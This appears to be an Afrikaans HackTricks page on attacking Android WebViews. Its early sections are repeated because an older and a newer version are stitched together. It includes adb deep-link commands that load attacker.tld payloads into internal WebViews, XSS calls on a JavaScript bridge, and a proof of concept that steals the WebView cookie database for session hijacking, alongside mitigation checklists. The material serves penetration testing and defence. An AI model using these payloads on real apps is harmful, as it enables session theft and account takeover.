# Webview Attacks

{{#include ../../banners/hacktricks-training.md}}

## Gids oor WebView-konfigurasies en sekuriteit

### Oorsig van WebView-kwesbaarhede

'n Kritieke aspek van Android-ontwikkeling behels die korrekte hantering van WebViews. Hierdie gids beklemtoon sleutelkonfigurasies en sekuriteitspraktyke om risiko's wat met WebView-gebruik geassosieer word, te verminder.

![WebView Voorbeeld](<../../images/image (1190).png>)

### **File Access in WebViews**

By verstek laat WebViews lêertoegang toe. Hierdie funksionaliteit word beheer deur die `setAllowFileAccess()` metode, beskikbaar sedert Android API vlak 3 (Cupcake 1.5). Aansoeke met die **android.permission.READ_EXTERNAL_STORAGE** permissie kan lêers vanaf eksterne berging lees deur 'n file URL-skema te gebruik (`file://path/to/file`).

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: Hierdie verouderde funksie het cross-origin versoeke vanaf file-URL's toegelaat, wat 'n beduidende sekuriteitsrisiko inhou weens moontlike XSS-aanvalle. Die verstekinstelling is gedeaktiveer (`false`) vir apps wat op Android Jelly Bean en nuwer mik.
- To check this setting, use `getAllowUniversalAccessFromFileURLs()`.
- To modify this setting, use `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Hierdie funksie, ook verouderd, het toegang tot inhoud vanaf ander file-skema URL's beheer. Soos universal access is die verstek ingestel op gedeaktiveer vir verbeterde sekuriteit.
- Use `getAllowFileAccessFromFileURLs()` to check and `setAllowFileAccessFromFileURLs(boolean)` to set.

#### **Secure File Loading**

Vir die deaktivering van lêerstelseltoegang terwyl jy steeds toegang tot assets en resources behou, word die `setAllowFileAccess()` metode gebruik. Met Android R en later is die verstekinstelling `false`.

- Check with `getAllowFileAccess()`.
- Enable or disable with `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Die **WebViewAssetLoader** klas is die moderne benadering vir die laai van plaaslike lêers. Dit gebruik http(s) URL's vir toegang tot plaaslike assets en resources, wat saamval met die Same-Origin policy, en sodoende CORS-bestuur vergemaklik.

### loadUrl

Dit is 'n algemene funksie wat gebruik word om arbitraire URL's in 'n WebView te laai:
```java
webview.loadUrl("<url here>")
```
Natuurlik moet 'n potensiële aanvaller nooit in staat wees om die **URL te beheer** wat 'n toepassing gaan laai nie.

### **JavaScript en Intent Scheme hantering**

- **JavaScript**: Standaard gedeaktiveer in WebViews, dit kan geaktiveer word via `setJavaScriptEnabled()`. Wees versigtig, want die aktivering van JavaScript sonder behoorlike voorsorgmaatreëls kan sekuriteitskwessies inbring.
- **Intent Scheme**: WebViews kan die `intent` scheme hanteer, wat moontlik tot exploits kan lei as dit nie noukeurig bestuur word nie. 'n Voorbeeld van 'n kwesbaarheid het 'n blootgestelde WebView-parameter "support_url" behels wat uitgebuit kon word om cross-site scripting (XSS) aanvalle uit te voer.

![Kwetsbare WebView](<../../images/image (1191).png>)

Voorbeeld van uitbuiting met adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Android bied 'n funksie wat **JavaScript** in 'n WebView in staat stel om **native Android app-funksies** aan te roep. Dit word bereik deur die `addJavascriptInterface`-metode te gebruik, wat JavaScript met native Android-funksionaliteit integreer, genoem as 'n _WebView JavaScript bridge_. Wees versigtig aangesien hierdie metode alle bladsye binne die WebView toelaat om toegang tot die geregistreerde JavaScript Interface-object te kry, wat 'n sekuriteitsrisiko inhou indien sensitiewe inligting deur hierdie interfaces blootgestel word.

- **Uiters versigtig wees** vir apps wat op Android-weergawes onder 4.2 mik, weens 'n kwesbaarheid wat remote code execution deur kwaadwillige JavaScript moontlik maak deur reflection te misbruik.

#### Implementering van 'n JavaScript Bridge

- **JavaScript interfaces** kan met native kode kommunikeer, soos getoon in die voorbeelde waar 'n klassemetode aan JavaScript blootgestel word:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge word geaktiveer deur 'n interface by die WebView te voeg:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Potensiële uitbuiting deur JavaScript, byvoorbeeld, via 'n XSS attack, maak dit moontlik om blootgestelde Java methods aan te roep:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Om risiko's te beperk, **restrict JavaScript bridge usage** tot kode wat saam met die APK versend word en voorkom dat JavaScript vanaf afgeleë bronne gelaai word. Vir ouer toestelle, stel die minimum API level op 17.

### Reflection-based Remote Code Execution (RCE

- 'n Gedokumenteerde metode maak dit moontlik om RCE deur refleksie te bereik deur 'n spesifieke payload uit te voer. Die `@JavascriptInterface` annotasie voorkom egter onbevoegde toegang tot metodes, wat die attack surface beperk.

### Remote Debugging

- **Remote debugging** is moontlik met **Chrome Developer Tools**, wat interaksie en arbitraire JavaScript-uitvoering binne die WebView-inhoud moontlik maak.

#### Aktiveer Remote Debugging

- Remote debugging kan vir alle WebViews binne 'n toepassing aangeskakel word deur:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Om debugging voorwaardelik te aktiveer gebaseer op die toepassing se debuggable toestand:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate arbitrêre lêers

- Demonstreer die exfiltration van arbitrêre lêers met behulp van 'n XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
# WebView-aanvalle



## Gids oor WebView-konfigurasies en Sekuriteit

### Oorsig van WebView kwesbaarhede

'n Kritieke aspek van Android-ontwikkeling behels die korrekte hantering van WebViews. Hierdie gids beklemtoon sleutelkonfigurasies en sekuriteitspraktyke om risiko's verbonde aan WebView-gebruik te beperk.

![WebView Voorbeeld](<../../images/image (1190).png>)

### **Lêertoegang in WebViews**

By verstek laat WebViews lêertoegang toe. Hierdie funksionaliteit word beheer deur die `setAllowFileAccess()` metode, beskikbaar sedert Android API vlak 3 (Cupcake 1.5). Aansoeke met die **android.permission.READ_EXTERNAL_STORAGE** toestemming kan lêers vanaf eksterne stoorplek lees deur 'n file URL-skema te gebruik (`file://path/to/file`).

#### **Verouderde Funksies: Universal and File Access From URLs**

- **Universal Access From File URLs**: Hierdie verouderde funksie het cross-origin versoeke vanaf file-URLs toegelaat, wat 'n beduidende sekuriteitsrisiko geskep het weens potensiële XSS-aanvalle. Die verstekinstelling is gedeaktiveer (`false`) vir apps wat op Android Jelly Bean en nuwer mik.
- Om hierdie instelling na te gaan, gebruik `getAllowUniversalAccessFromFileURLs()`.
- Om hierdie instelling te verander, gebruik `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Hierdie funksie, ook verouderd, het toegang tot inhoud van ander file-skema-URLs beheer. Soos universal access, is die verstekinstelling gedeaktiveer vir verbeterde sekuriteit.
- Gebruik `getAllowFileAccessFromFileURLs()` om te kontroleer en `setAllowFileAccessFromFileURLs(boolean)` om te stel.

#### **Veilige Lêerlaai**

Om lêerstelseltoegang te deaktiveer terwyl assets en bronne steeds toeganklik bly, word die `setAllowFileAccess()` metode gebruik. Met Android R en hoër is die verstekinstelling `false`.

- Kontroleer met `getAllowFileAccess()`.
- Skakel aan of af met `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Die **WebViewAssetLoader** klas is die moderne benadering vir die laai van plaaslike lêers. Dit gebruik http(s)-URLs om plaaslike assets en bronne te raadpleeg, wat in lyn is met die Same-Origin policy en sodoende CORS-bestuur vergemaklik.

### loadUrl

Dit is 'n algemene funksie wat gebruik word om arbitrêre URLs in 'n WebView te laai:
```java
webview.loadUrl("<url here>")
```
Natuurlik, 'n moontlike aanvaller moet nooit in staat wees om die **URL te beheer** wat 'n toepassing gaan laai nie.

### Deep-linking na interne WebView (custom scheme → WebView sink)

Baie apps registreer custom schemes/paths wat 'n user-supplied URL na 'n in-app WebView deurstuur. As die deep link exported is (VIEW + BROWSABLE), kan 'n aanvaller die app dwing om willekeurige eksterne inhoud binne die WebView-konteks te vertoon.

Tipiese manifest-patroon (vereenvoudig):
```xml
<activity android:name=".MainActivity" android:exported="true">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<category android:name="android.intent.category.BROWSABLE" />
<data android:scheme="myscheme" android:host="com.example.app" />
</intent-filter>
</activity>
```
Algemene kodevloei (vereenvoudigde):
```java
// Entry activity
@Override
protected void onNewIntent(Intent intent) {
Uri deeplink = intent.getData();
String url = deeplink.getQueryParameter("url"); // attacker-controlled
if (deeplink.getPathSegments().get(0).equals("web")) {
Intent i = new Intent(this, WebActivity.class);
i.putExtra("url", url);
startActivity(i);
}
}

// WebActivity sink
webView.loadUrl(getIntent().getStringExtra("url"));
```
Aanvalspatroon en PoC via adb:
```bash
# Template – force load in internal WebView
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# If a specific Activity must be targeted
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impak: die afgeleë bladsy hardloop in die app WebView konteks (cookies/session of the app WebView profile, toegang tot enige blootgestelde @JavascriptInterface, potensiële toegang tot content:// en file:// afhangend van instellings).

Soekwenke:
- Grep gedekompileerde bronne vir `getQueryParameter("url")`, `loadUrl(`, `WebView` sinks, en deep-link handlers (`onCreate/onNewIntent`).
- Hersien die manifest vir VIEW+BROWSABLE filters en pasgemaakte schemes/hosts wat na aktiwiteite map wat later 'n WebView begin.
- Kyk of daar veelvuldige deep-link paths is (e.g., an “external browser” path vs. an “internal webview” path) en verkies die een wat binne die app render.

### Enabling JavaScript before verification (order-of-checks bug)

'n Gereelde verhardingsfout is om JavaScript te aktiveer of versoepelde WebView-instellings te konfigureer voordat die finale allowlist/verifikasie van die target URL voltooi is. As die verifikasie inkonsekwent is oor helpers of te laat plaasvind, kan 'n aanvaller deep link 'n toestand bereik waar:

1) WebView settings apply (e.g., `setJavaScriptEnabled(true)`), en
2) Die onbetroubare URL word gelaai met JavaScript enabled.

Foutpatroon (pseudocode):
```java
// 1) Parse/early checks
Uri u = parse(intent);
if (!looksValid(u)) return;

// 2) Configure WebView BEFORE final checks
webView.getSettings().setJavaScriptEnabled(true); // BAD: too early
configureMixedContent();

// 3) Do final verification (late)
if (!finalAllowlist(u)) return; // too late – JS already enabled

// 4) Load
webView.loadUrl(u.toString());
```
Waarom dit uitbuitbaar is
- Inkonsekwente normalisering: helpers split/rebuild die URL anders as die finale kontrole, wat ongelykhede skep wat 'n kwaadwillige URL kan uitbuit.
- Verkeerd gerangskikte verwerkingspyplyn: die inskakeling van JS in stap 2 is globaal vir die WebView-instantie en beïnvloed die finale laai selfs al sou verifikasie later faal.

Hoe om te toets
- Skep deep-link payloads wat vroeë kontroles slaag en die WebView-konfigurasiewebblad bereik.
- Gebruik adb om implicit VIEW intents te stuur wat 'n `url=`-parameter lewer wat deur jou beheer word:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
As die eksploitasie slaag, voer jou payload JavaScript in die app se WebView uit. Van daar af, sondeer vir blootgestelde bridges:
```html
<script>
for (let k in window) {
try { if (typeof window[k] === 'object' || typeof window[k] === 'function') console.log('[JSI]', k); } catch(e){}
}
</script>
```
Verdedigingsriglyne
- Kanoniseer een keer; valideer streng teen 'n enkele bron van waarheid (scheme/host/path/query).
- Roep slegs `setJavaScriptEnabled(true)` aan nadat alle allowlist checks geslaag het en net voordat vertroude inhoud gelaai word.
- Vermy om `@JavascriptInterface` aan onbetroubare origins bloot te stel; verkies per-origin gating.
- Oorweeg per-WebView-instanties vir vertroude vs onbetroubare inhoud, met JS standaard gedeaktiveer.

### **JavaScript and Intent Scheme Handling**

- **JavaScript**: In WebViews is dit standaard gedeaktiveer; dit kan aangeskakel word via `setJavaScriptEnabled()`. Voorzichtigheid word aanbeveel, aangesien die aanskakeling van JavaScript sonder toepaslike waarborge sekuriteitsgate kan inbring.
- **Intent Scheme**: WebViews kan die `intent` scheme hanteer, wat moontlik tot exploits kan lei as dit nie versigtig bestuur word nie. 'n Voorbeeld van 'n kwesbaarheid betrokke 'n ontbloot WebView-parameter "support_url" wat misbruik kon word om cross-site scripting (XSS)-aanvalle uit te voer.

![Vulnerable WebView](<../../images/image (1191).png>)

Eksploitasievoorbeeld met adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Android bied 'n funksie wat **JavaScript** in 'n WebView in staat stel om **native Android app functions** aan te roep. Dit word bereik deur die `addJavascriptInterface`-metode te gebruik, wat JavaScript met native Android-funksionaliteite integreer, bekend as 'n _WebView JavaScript bridge_. Versigtigheid word aanbeveel aangesien hierdie metode alle bladsye binne die WebView toegang gee tot die geregistreerde JavaScript Interface-objek, wat 'n sekuriteitsrisiko inhou as sensitiewe inligting deur hierdie interfaces blootgestel word.

- **Extreme caution is required** vir apps wat gemik is op Android-weergawes onder 4.2 weens 'n kwesbaarheid wat remote code execution deur kwaadwillige JavaScript moontlik maak deur reflection uit te buit.

#### Implementing a JavaScript Bridge

- **JavaScript interfaces** kan met native code kommunikeer, soos getoon in die voorbeelde waar 'n klasmetode aan JavaScript blootgestel word:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge word geaktiveer deur 'n interface by die WebView te voeg:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Potensiële uitbuiting deur JavaScript, byvoorbeeld via 'n XSS attack, maak die aanroep van blootgestelde Java methods moontlik:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Om risiko's te verminder, beperk **JavaScript bridge usage** tot kode wat met die APK gelewer word en verhoed dat JavaScript vanaf afgeleë bronne gelaai word. Vir ouer toestelle stel die minimum API level op 17.

#### Misbruik van dispatcher-style JS bridges (invokeMethod/handlerName)

'n Algemene patroon is 'n enkele geëksporteerde metode (bv. `@JavascriptInterface void invokeMethod(String json)`) wat attacker-controlled JSON deserialiseer na 'n generiese objek en dan op grond van 'n verskafde handler name dispatch. Tipiese JSON-struktuur:
```json
{
"handlerName": "toBase64",
"callbackId": "cb_12345",
"asyncExecute": "true",
"data": { /* handler-specific fields */ }
}
```
Risk: as enige geregistreerde handler bevoorregte aksies op aanvaller-data uitvoer (bv. direkte lêerlesings), kan jy dit aanroep deur `handlerName` onderskeidelik te stel. Resultate word gewoonlik terug in die bladsykonteks geplaas via `evaluateJavascript` en 'n callback/promise-meganisme gesleutel deur `callbackId`.

Key hunting steps
- Dekompileer en grep vir `addJavascriptInterface(` om die brug-objeknaam te bepaal (bv. `xbridge`).
- In Chrome DevTools (chrome://inspect), tik die brug-objeknaam in die Console (bv. `xbridge`) om blootgestelde velde/metodes te lys; kyk vir 'n generiese dispatcher soos `invokeMethod`.
- Lys handlers deur te soek na klasse wat `getModuleName()` implementeer of registrasie maps.

#### Arbitrary file read via URI → File sinks (Base64 exfiltration)

If a handler takes a URI, calls `Uri.parse(req.getUri()).getPath()`, builds `new File(...)` and reads it without allowlists or sandbox checks, you get an arbitrary file read in the app sandbox that bypasses WebView settings like `setAllowFileAccess(false)` (the read happens in native code, not via the WebView network stack).

PoC om die Chromium WebView cookie DB (session hijack) uit te eksfiltreer:
```javascript
// Minimal callback sink so native can deliver the response
window.WebViewJavascriptBridge = {
_handleMessageFromObjC: function (data) { console.log(data) }
};

const payload = JSON.stringify({
handlerName: 'toBase64',
callbackId: 'cb_' + Date.now(),
data: { uri: 'file:///data/data/<pkg>/app_webview/Default/Cookies' }
});

xbridge.invokeMethod(payload);
```
Aantekeninge
- Cookie DB paths vary across devices/providers. Common ones:
- `file:///data/data/<pkg>/app_webview/Default/Cookies`
- `file:///data/data/<pkg>/app_webview_<pkg>/Default/Cookies`
- Die handler returneer Base64; decodeer dit om cookies te herstel en as die gebruiker in die app se WebView-profiel voor te gee.

Opsporingstips
- Kyk uit vir groot Base64-stringe wat via `evaluateJavascript` teruggegee word terwyl jy die app gebruik.
- Grep gedecompileerde bronne vir handlers wat `uri`/`path` aanvaar en dit omskakel na `new File(...)`.

#### Bypassing WebView privilege gates – endsWith() host checks

Besluite oor privilegies (die kies van 'n JSB-enabled Activity) berus dikwels op host allowlists. 'n Gebrekkige patroon is:
```java
String host = Uri.parse(url).getHost();
boolean z = true;
if (!host.endsWith(".trusted.com")) {
if (!".trusted.com".endsWith(host)) {
z = false;
}
}
// z==true → open privileged WebView
```
Ekwivalente logika (De Morgan se):
```java
boolean z = host.endsWith(".trusted.com") ||
".trusted.com".endsWith(host);
```
Dit is nie 'n origin check' nie. Baie onbedoelde hosts voldoen aan die tweede klousule, wat onbetroubare domeine toegang gee tot die bevoorregte Activity. Verifieer altyd scheme en host teen 'n streng allowlist (presiese ooreenkoms of 'n korrekte subdomain-kontrole met punt-afbakenings), nie `endsWith`-truuks nie.

#### javascript:// execution primitive via loadUrl

Wanneer 'n app binne 'n bevoorregte WebView is, voer dit soms inline JS uit via:
```java
webView.loadUrl("javascript:" + jsPayload);
```
As 'n interne vloei `loadUrl("javascript:...")` in daardie konteks aktiveer, voer ingestopte JS uit met bridge-toegang selfs al sou die eksterne bladsy normaalweg nie toegelaat word nie. Pentest steps:
- Grep vir `loadUrl("javascript:` and `evaluateJavascript(` in die app.
- Probeer om daardie kodepaaie te bereik nadat jy navigasie geforseer het na die bevoorregte WebView (e.g., via a permissive deep link chooser).
- Gebruik die primitief om die dispatcher (`xbridge.invokeMethod(...)`) aan te roep en sensitiewe handlers te bereik.

Mitigations (developer checklist)
- Strikte oorsprongverifikasie vir bevoorregte Activities: kanoniseer en vergelyk scheme/host teen 'n eksplisiete allowlist; vermy `endsWith`-gebaseerde kontroles. Oorweeg Digital Asset Links waar van toepassing.
- Beperk bridges slegs tot vertroude bladsye en herkontroleer vertroue by elke oproep (per-oproep magtiging).
- Verwyder of beskerm streng handlers wat lêerstelsel-toegang kan gee; verkies `content://` met allowlists/toestemmings bo rou `file://`-paaie.
- Vermy `loadUrl("javascript:")` in bevoorregte kontekste of sit dit agter sterk kontroles.
- Onthou `setAllowFileAccess(false)` beskerm nie teen native lêerlees via die bridge nie.

#### JSB enumerasie en ontfoutingwenke

- Skakel WebView remote debugging aan om die Chrome DevTools Console te gebruik:
- Aan app-kant (debug builds): `WebView.setWebContentsDebuggingEnabled(true)`
- Stelsel-kant: modules soos [LSPosed](https://github.com/LSPosed/LSPosed) of Frida-skripte kan debugging afdwing selfs in release builds. Voorbeeld Frida-snippet vir Cordova WebViews: [cordova enable webview debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)
- In DevTools, tik die bridge-objeknaam (e.g., `xbridge`) om blootgestelde lede te sien en die dispatcher te ondersoek.


### Reflection-based Remote Code Execution (RCE)

- 'n Gedokumenteerde metode maak dit moontlik om RCE deur refleksie te bereik deur 'n spesifieke payload uit te voer. Die `@JavascriptInterface`-annotasie verhoed egter ongemagtigde metode-toegang en beperk die aanvalsvlak.

### Remote Debugging

- **Remote debugging** is moontlik met **Chrome Developer Tools**, wat interaksie en arbitrêre JavaScript-uitvoering binne die WebView-inhoud moontlik maak.

#### Enabling Remote Debugging

- Remote debugging kan vir alle WebViews binne 'n toepassing aangeskakel word deur:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Om debugging voorwaardelik te aktiveer gebaseer op die debuggable state van die toepassing:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate willekeurige lêers

- Demonstreer die exfiltration van willekeurige lêers met behulp van 'n XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
## Verwysings

- [Oorsig van Android WebViews file access attack vectors](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [WheresMyBrowser.Android (demo-app)](https://github.com/authenticationfailure/WheresMyBrowser.Android)
- [Android WebView verwysing](https://developer.android.com/reference/android/webkit/WebView)
- [Deep Links & WebViews Eksploitasies – Deel II](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
- [Deep Links & WebViews Eksploitasies – Deel I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Deurloop](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 aanvalsketting (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstrasievideo](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Account takeover in Android app via JSB – tuxplorer.com](https://tuxplorer.com/posts/account-takeover-via-jsb/)
- [LSPosed – systemless Xposed framework](https://github.com/LSPosed/LSPosed)
- [Frida codeshare: Cordova – enable WebView debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)

{{#include ../../banners/hacktricks-training.md}}
